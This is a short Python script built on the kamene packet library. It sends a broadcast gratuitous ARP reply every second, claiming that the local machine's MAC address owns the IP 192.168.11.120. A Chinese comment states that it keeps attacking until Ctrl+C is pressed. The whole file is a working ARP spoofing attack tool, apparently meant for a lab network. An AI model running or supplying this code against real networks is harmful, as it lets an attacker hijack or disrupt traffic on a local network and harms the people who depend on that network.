#!/usr/bin/env python3
# -*- coding=utf-8 -*-

from kamene.all import *
from GET_MAC_netifaces import get_mac_address  # 导入获取本机MAC地址方法


def arp_reply(ip_address):
    mac_address = get_mac_address('ens33')
    while True:  # 一直攻击，直到ctl+c出现！！！
        sendp(Ether(dst='ff:ff:ff:ff:ff:ff', src=mac_address) / ARP(op=2, hwsrc=mac_address, hwdst=mac_address, psrc=ip_address, pdst=ip_address), verbose=False)
        time.sleep(1)

if __name__ == '__main__':
    arp_reply('192.168.11.120')

